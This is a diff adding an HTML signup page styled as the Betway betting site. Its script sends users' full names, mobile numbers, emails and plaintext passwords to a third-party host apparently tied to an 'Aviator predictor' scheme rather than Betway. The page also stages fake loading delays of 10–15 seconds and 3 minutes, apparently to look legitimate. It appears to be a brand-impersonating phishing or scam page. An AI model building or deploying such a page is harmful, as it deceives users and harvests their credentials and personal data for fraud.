@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Betway - Create Account</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎰</text></svg>" />
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.0/css/all.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .signup-container {
+            background: #141414;
+            padding: 45px 35px 40px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 420px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95);
+            position: relative;
+            min-height: 500px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo h1 {
+            font-size: 42px;
+            font-weight: 900;
+            color: #ffffff;
+            letter-spacing: 1px;
+        }
+
+        .logo h1 span {
+            color: #f5c518;
+        }
+
+        .logo p {
+            color: #f5c518;
+            font-size: 10px;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            margin-top: 2px;
+            font-weight: 300;
+        }
+
+        .signup-heading {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .signup-sub {
+            color: #888;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            color: #bbbbbb;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+
+        /* ===== INPUT WITH COUNTRY CODE ===== */
+        .input-group .input-wrap {
+            display: flex;
+            align-items: center;
+            background: #0d0d0d;
+            border: 2px solid #2a2a2a;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .input-group .input-wrap:focus-within {
+            border-color: #f5c518;
+            background: #111;
+            box-shadow: 0 0 25px rgba(245, 197, 24, 0.06);
+        }
+
+        /* ===== COUNTRY CODE DROPDOWN ===== */
+        .input-group .country-code {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 0 10px 0 14px;
+            border-right: 1px solid #2a2a2a;
+            cursor: pointer;
+            position: relative;
+            min-width: 80px;
+            height: 100%;
+            user-select: none;
+            flex-shrink: 0;
+            padding-top: 14px;
+            padding-bottom: 14px;
+        }
+
+        .input-group .country-code:hover {
+            background: #1a1a1a;
+        }
+
+        .input-group .country-code .flag {
+            font-size: 22px;
+            line-height: 1;
+        }
+
+        .input-group .country-code .code {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .input-group .country-code .arrow {
+            color: #888;
+            font-size: 11px;
+            margin-left: 2px;
+            transition: transform 0.3s ease;
+        }
+
+        .input-group .country-code .arrow.open {
+            transform: rotate(180deg);
+        }
+
+        .input-group .country-code .dropdown {
+            display: none;
+            position: absolute;
+            top: calc(100% + 8px);
+            left: -2px;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            min-width: 200px;
+            z-index: 9999;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9);
+            overflow: hidden;
+            padding: 6px 0;
+        }
+
+        .input-group .country-code .dropdown.open {
+            display: block;
+        }
+
+        .input-group .country-code .dropdown .option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            color: #dddddd;
+            font-size: 14px;
+        }
+
+        .input-group .country-code .dropdown .option:hover {
+            background: #2a2a2a;
+            color: #f5c518;
+        }
+
+        .input-group .country-code .dropdown .option .flag {
+            font-size: 22px;
+        }
+
+        .input-group .country-code .dropdown .option .code {
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .input-group .country-code .dropdown .option .country-name {
+            color: #888;
+            font-size: 12px;
+            margin-left: auto;
+        }
+
+        .input-group input[type="text"],
+        .input-group input[type="tel"],
+        .input-group input[type="email"],
+        .input-group input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            flex: 1;
+            min-width: 0;
+        }
+
+        .input-group input::placeholder {
+            color: #444;
+            font-size: 14px;
+        }
+
+        .input-group .input-icon {
+            padding-right: 16px;
+            color: #555;
+            font-size: 17px;
+            flex-shrink: 0;
+        }
+
+        /* ===== PASSWORD FIELD ===== */
+        .input-group .password-wrap {
+            display: flex;
+            align-items: center;
+            background: #0d0d0d;
+            border: 2px solid #2a2a2a;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            overflow: hidden;
+        }
+
+        .input-group .password-wrap:focus-within {
+            border-color: #f5c518;
+            background: #111;
+            box-shadow: 0 0 25px rgba(245, 197, 24, 0.06);
+        }
+
+        .input-group .password-wrap input {
+            width: 100%;
+            padding: 14px 16px;
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            flex: 1;
+        }
+
+        .input-group .password-wrap input::placeholder {
+            color: #444;
+            font-size: 14px;
+        }
+
+        .input-group .password-wrap .input-icon {
+            padding-right: 16px;
+            color: #555;
+            font-size: 17px;
+            cursor: pointer;
+            transition: 0.3s;
+            z-index: 2;
+        }
+
+        .input-group .password-wrap .input-icon:hover {
+            color: #f5c518;
+        }
+
+        .input-group .password-wrap .input-icon.active {
+            color: #f5c518;
+        }
+
+        /* ===== TERMS ===== */
+        .terms-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 16px 0 22px 0;
+        }
+
+        .terms-row input[type="checkbox"] {
+            accent-color: #f5c518;
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .terms-row label {
+            color: #aaaaaa;
+            font-size: 13px;
+            line-height: 1.5;
+            cursor: pointer;
+        }
+
+        .terms-row label a {
+            color: #f5c518;
+            text-decoration: none;
+        }
+
+        .terms-row label a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== SIGNUP BUTTON ===== */
+        .signup-btn {
+            width: 100%;
+            padding: 16px;
+            background: #f5c518;
+            border: none;
+            border-radius: 10px;
+            color: #000000;
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 30px rgba(245, 197, 24, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .signup-btn:hover:not(:disabled) {
+            background: #ffd700;
+            transform: scale(1.02);
+            box-shadow: 0 12px 40px rgba(245, 197, 24, 0.4);
+        }
+
+        .signup-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .signup-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: scale(0.98);
+        }
+
+        .signup-btn .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(0,0,0,0.3);
+            border-radius: 50%;
+            border-top-color: #000000;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+
+        .signup-btn .spinner.active {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .signup-btn .btn-text {
+            display: inline-block;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 28px 0 22px;
+            gap: 15px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #2a2a2a;
+        }
+
+        .divider span {
+            color: #555;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .login-text {
+            text-align: center;
+            color: #aaaaaa;
+            font-size: 15px;
+        }
+
+        .login-text a {
+            color: #f5c518;
+            font-weight: 700;
+            text-decoration: none;
+            font-size: 16px;
+            margin-left: 4px;
+            cursor: pointer;
+        }
+
+        .login-text a:hover {
+            text-decoration: underline;
+        }
+
+        #message {
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-bottom: 18px;
+            font-size: 14px;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        #message.error {
+            display: block;
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            color: #ff6b6b;
+        }
+
+        #message.success {
+            display: block;
+            background: rgba(0, 166, 81, 0.15);
+            border: 1px solid rgba(0, 166, 81, 0.3);
+            color: #00c45a;
+        }
+
+        .page-loader {
+            display: flex;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(20, 20, 20, 0.95);
+            border-radius: 16px;
+            z-index: 30;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .page-loader .big-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(245, 197, 24, 0.2);
+            border-radius: 50%;
+            border-top-color: #f5c518;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+
+        .page-loader p {
+            color: #f5c518;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .page-loader .sub-text {
+            color: #888;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        .page-loader.hidden {
+            display: none;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(20, 20, 20, 0.92);
+            border-radius: 16px;
+            z-index: 20;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-overlay .big-spinner {
+            width: 55px;
+            height: 55px;
+            border: 4px solid rgba(245, 197, 24, 0.2);
+            border-radius: 50%;
+            border-top-color: #f5c518;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+
+        .loading-overlay p {
+            color: #f5c518;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        .loading-overlay .sub-text {
+            color: #888;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        .content-hidden {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .signup-container {
+                padding: 30px 20px;
+            }
+            .logo h1 {
+                font-size: 34px;
+            }
+            .signup-heading {
+                font-size: 20px;
+            }
+            .input-group .country-code {
+                padding: 0 6px 0 10px;
+                min-width: 60px;
+            }
+            .input-group .country-code .flag {
+                font-size: 18px;
+            }
+            .input-group .country-code .code {
+                font-size: 12px;
+            }
+            .input-group .country-code .dropdown {
+                min-width: 170px;
+                left: -10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="signup-container" id="appContainer">
+
+        <!-- ===== PAGE LOADER ===== -->
+        <div class="page-loader" id="pageLoader">
+            <div class="big-spinner"></div>
+            <p>Loading Betway...</p>
+            <span class="sub-text">Please wait while we prepare your experience</span>
+        </div>
+
+        <!-- ===== SIGNUP CONTENT ===== -->
+        <div id="pageContent" class="content-hidden">
+
+            <!-- ===== SIGNUP LOADER ===== -->
+            <div class="loading-overlay" id="loadingOverlay">
+                <div class="big-spinner"></div>
+                <p>Creating your account...</p>
+                <span class="sub-text">Please wait while we process your registration</span>
+            </div>
+
+            <!-- ===== LOGO ===== -->
+            <div class="logo">
+                <h1>BET<span>WAY</span></h1>
+                <p>Sports · Casino · Games</p>
+            </div>
+
+            <!-- ===== HEADING ===== -->
+            <div class="signup-heading">Create Account</div>
+            <div class="signup-sub">Join Betway and start winning today</div>
+
+            <!-- ===== MESSAGE ===== -->
+            <div id="message"></div>
+
+            <!-- ===== FULL NAME ===== -->
+            <div class="input-group">
+                <label>Full Name</label>
+                <div class="input-wrap">
+                    <input type="text" id="fullName" placeholder="Enter your full name" />
+                    <span class="input-icon"><i class="fas fa-user"></i></span>
+                </div>
+            </div>
+
+            <!-- ===== MOBILE NUMBER WITH COUNTRY CODE ===== -->
+            <div class="input-group">
+                <label>Mobile Number</label>
+                <div class="input-wrap">
+                    <div class="country-code" id="countrySelector">
+                        <span class="flag" id="selectedFlag">🇿🇦</span>
+                        <span class="code" id="selectedCode">+27</span>
+                        <span class="arrow" id="dropdownArrow"><i class="fas fa-chevron-down"></i></span>
+                        <div class="dropdown" id="countryDropdown">
+                            <div class="option" data-flag="🇿🇦" data-code="+27">
+                                <span class="flag">🇿🇦</span>
+                                <span class="code">+27</span>
+                                <span class="country-name">South Africa</span>
+                            </div>
+                            <div class="option" data-flag="🇿🇼" data-code="+263">
+                                <span class="flag">🇿🇼</span>
+                                <span class="code">+263</span>
+                                <span class="country-name">Zimbabwe</span>
+                            </div>
+                        </div>
+                    </div>
+                    <input type="tel" id="mobileNumber" placeholder="71 234 5678" />
+                    <span class="input-icon"><i class="fas fa-phone"></i></span>
+                </div>
+            </div>
+
+            <!-- ===== EMAIL ===== -->
+            <div class="input-group">
+                <label>Email Address</label>
+                <div class="input-wrap">
+                    <input type="email" id="email" placeholder="Enter your email address" />
+                    <span class="input-icon"><i class="fas fa-envelope"></i></span>
+                </div>
+            </div>
+
+            <!-- ===== PASSWORD ===== -->
+            <div class="input-group">
+                <label>Create Password</label>
+                <div class="password-wrap">
+                    <input type="password" id="password" placeholder="Create a strong password" />
+                    <span class="input-icon" id="togglePassword">
+                        <i class="fas fa-eye-slash"></i>
+                    </span>
+                </div>
+            </div>
+
+            <!-- ===== CONFIRM PASSWORD ===== -->
+            <div class="input-group">
+                <label>Confirm Password</label>
+                <div class="password-wrap">
+                    <input type="password" id="confirmPassword" placeholder="Confirm your password" />
+                    <span class="input-icon" id="toggleConfirmPassword">
+                        <i class="fas fa-eye-slash"></i>
+                    </span>
+                </div>
+            </div>
+
+            <!-- ===== TERMS ===== -->
+            <div class="terms-row">
+                <input type="checkbox" id="termsCheck" />
+                <label for="termsCheck">
+                    I agree to the <a href="#">Terms &amp; Conditions</a> and 
+                    <a href="#">Privacy Policy</a>
+                </label>
+            </div>
+
+            <!-- ===== SIGNUP BUTTON ===== -->
+            <button class="signup-btn" id="signupBtn">
+                <span class="spinner" id="spinner"></span>
+                <span class="btn-text" id="btnText">Create Account</span>
+            </button>
+
+            <!-- ===== DIVIDER ===== -->
+            <div class="divider">
+                <span>Already have an account?</span>
+            </div>
+
+            <!-- ===== LOGIN LINK ===== -->
+            <p class="login-text">
+                <a id="loginLink">Login</a>
+            </p>
+
+        </div>
+
+    </div>
+
+    <script>
+        // ============================================
+        // COMPLETE JAVASCRIPT - SIGNUP PAGE
+        // ============================================
+
+        console.log('🔴 Signup page loaded!');
+
+        // ============================================
+        // COUNTRY CODE DROPDOWN
+        // ============================================
+
+        var countrySelector = document.getElementById('countrySelector');
+        var countryDropdown = document.getElementById('countryDropdown');
+        var dropdownArrow = document.getElementById('dropdownArrow');
+        var selectedFlag = document.getElementById('selectedFlag');
+        var selectedCode = document.getElementById('selectedCode');
+        var selectedCountryCode = '+27';
+
+        countrySelector.addEventListener('click', function(e) {
+            e.stopPropagation();
+            countryDropdown.classList.toggle('open');
+            dropdownArrow.classList.toggle('open');
+        });
+
+        var options = document.querySelectorAll('.option');
+        options.forEach(function(option) {
+            option.addEventListener('click', function(e) {
+                e.stopPropagation();
+                var flag = this.getAttribute('data-flag');
+                var code = this.getAttribute('data-code');
+                selectedFlag.textContent = flag;
+                selectedCode.textContent = code;
+                selectedCountryCode = code;
+                countryDropdown.classList.remove('open');
+                dropdownArrow.classList.remove('open');
+                console.log('🌍 Country selected:', code);
+            });
+        });
+
+        document.addEventListener('click', function() {
+            countryDropdown.classList.remove('open');
+            dropdownArrow.classList.remove('open');
+        });
+
+        // ============================================
+        // PAGE LOADING
+        // ============================================
+
+        var pageLoader = document.getElementById('pageLoader');
+        var pageContent = document.getElementById('pageContent');
+
+        var pageLoadTime = Math.floor(Math.random() * (15000 - 10000 + 1)) + 10000;
+        console.log('⏳ Page loading for ' + (pageLoadTime / 1000) + ' seconds...');
+
+        setTimeout(function() {
+            pageLoader.classList.add('hidden');
+            pageContent.classList.remove('content-hidden');
+            console.log('✅ Signup page loaded!');
+        }, pageLoadTime);
+
+        // ============================================
+        // GET ELEMENTS
+        // ============================================
+
+        var fullNameInput = document.getElementById('fullName');
+        var mobileInput = document.getElementById('mobileNumber');
+        var emailInput = document.getElementById('email');
+        var passwordInput = document.getElementById('password');
+        var confirmInput = document.getElementById('confirmPassword');
+        var termsCheck = document.getElementById('termsCheck');
+        var signupBtn = document.getElementById('signupBtn');
+        var spinner = document.getElementById('spinner');
+        var btnText = document.getElementById('btnText');
+        var messageDiv = document.getElementById('message');
+        var loadingOverlay = document.getElementById('loadingOverlay');
+        var loginLink = document.getElementById('loginLink');
+        var togglePassword = document.getElementById('togglePassword');
+        var toggleConfirmPassword = document.getElementById('toggleConfirmPassword');
+
+        // ============================================
+        // PASSWORD TOGGLES
+        // ============================================
+
+        var isPasswordVisible = false;
+        var isConfirmVisible = false;
+
+        togglePassword.addEventListener('click', function() {
+            isPasswordVisible = !isPasswordVisible;
+            if (isPasswordVisible) {
+                passwordInput.type = 'text';
+                togglePassword.innerHTML = '<i class="fas fa-eye"></i>';
+                togglePassword.classList.add('active');
+            } else {
+                passwordInput.type = 'password';
+                togglePassword.innerHTML = '<i class="fas fa-eye-slash"></i>';
+                togglePassword.classList.remove('active');
+            }
+        });
+
+        toggleConfirmPassword.addEventListener('click', function() {
+            isConfirmVisible = !isConfirmVisible;
+            if (isConfirmVisible) {
+                confirmInput.type = 'text';
+                toggleConfirmPassword.innerHTML = '<i class="fas fa-eye"></i>';
+                toggleConfirmPassword.classList.add('active');
+            } else {
+                confirmInput.type = 'password';
+                toggleConfirmPassword.innerHTML = '<i class="fas fa-eye-slash"></i>';
+                toggleConfirmPassword.classList.remove('active');
+            }
+        });
+
+        // ============================================
+        // FUNCTIONS
+        // ============================================
+
+        function showMessage(text, type) {
+            messageDiv.textContent = text;
+            messageDiv.className = type;
+            console.log('📢 Message:', text);
+        }
+
+        function hideMessage() {
+            messageDiv.textContent = '';
+            messageDiv.className = '';
+        }
+
+        function showLoading() {
+            console.log('⏳ Creating account...');
+            signupBtn.disabled = true;
+            spinner.classList.add('active');
+            btnText.textContent = 'Creating...';
+            loadingOverlay.classList.add('active');
+        }
+
+        function hideLoading() {
+            console.log('✅ Loading hidden');
+            signupBtn.disabled = false;
+            spinner.classList.remove('active');
+            btnText.textContent = 'Create Account';
+            loadingOverlay.classList.remove('active');
+        }
+
+        // ============================================
+        // GO TO LOGIN
+        // ============================================
+
+        function goToLogin() {
+            console.log('🔄 Going to login page...');
+            window.location.href = 'index.html';
+        }
+
+        // ============================================
+        // MAIN SIGNUP FUNCTION
+        // ============================================
+
+        function doSignup() {
+            console.log('🖱️ Signup button clicked!');
+
+            var fullName = fullNameInput.value.trim();
+            var rawNumber = mobileInput.value.trim().replace(/\s/g, '');
+            var email = emailInput.value.trim();
+            var password = passwordInput.value.trim();
+            var confirm = confirmInput.value.trim();
+
+            // Combine country code + number
+            var mobileNumber = selectedCountryCode + rawNumber;
+
+            console.log('📱 Full Mobile:', mobileNumber);
+            console.log('🌍 Country Code:', selectedCountryCode);
+
+            // ===== VALIDATION =====
+
+            if (!fullName || fullName.length < 2) {
+                showMessage('⚠️ Please enter your full name.', 'error');
+                return;
+            }
+
+            if (!rawNumber || rawNumber.length < 9) {
+                showMessage('⚠️ Please enter a valid mobile number (at least 9 digits).', 'error');
+                return;
+            }
+
+            if (!email) {
+                showMessage('⚠️ Please enter your email address.', 'error');
+                return;
+            }
+
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                showMessage('⚠️ Please enter a valid email address.', 'error');
+                return;
+            }
+
+            if (!password || password.length < 6) {
+                showMessage('⚠️ Password must be at least 6 characters.', 'error');
+                return;
+            }
+
+            if (password !== confirm) {
+                showMessage('⚠️ Passwords do not match.', 'error');
+                return;
+            }
+
+            if (!termsCheck.checked) {
+                showMessage('⚠️ Please agree to the Terms & Conditions.', 'error');
+                return;
+            }
+
+            hideMessage();
+            showLoading();
+
+            // ============================================
+            // SEND TO BACKEND
+            // ============================================
+
+            var apiUrl = 'https://betwayaviatorpredictor-production-0a61.up.railway.app/api/signup';
+            console.log('📤 Sending to:', apiUrl);
+
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    fullName: fullName,
+                    mobileNumber: mobileNumber,
+                    email: email,
+                    password: password,
+                    countryCode: selectedCountryCode
+                })
+            })
+            .then(function(response) {
+                console.log('📡 Response status:', response.status);
+                return response.json();
+            })
+            .then(function(data) {
+                console.log('📦 Response data:', data);
+
+                setTimeout(function() {
+                    hideLoading();
+                    if (data.success) {
+                        showMessage('✅ Account created successfully! Redirecting...', 'success');
+                        setTimeout(function() {
+                            window.location.href = 'index.html';
+                        }, 2000);
+                    } else {
+                        showMessage('❌ ' + (data.message || 'Signup failed.'), 'error');
+                    }
+                }, 180000); // 3 minutes
+            })
+            .catch(function(error) {
+                console.error('❌ ERROR:', error);
+
+                setTimeout(function() {
+                    hideLoading();
+                    showMessage('❌ Network error. Please try again.', 'error');
+                }, 180000); // 3 minutes
+            });
+        }
+
+        // ============================================
+        // ATTACH EVENT LISTENERS
+        // ============================================
+
+        signupBtn.addEventListener('click', doSignup);
+        loginLink.addEventListener('click', goToLogin);
+
+        console.log('✅ Button listener attached!');
+
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                var active = document.activeElement;
+                if (active === fullNameInput || active === mobileInput || 
+                    active === emailInput || active === passwordInput || 
+                    active === confirmInput) {
+                    console.log('⌨️ Enter key pressed!');
+                    doSignup();
+                }
+            }
+        });
+
+        console.log('✅ All systems ready!');
+    </script>
+
+</body>
+</html>
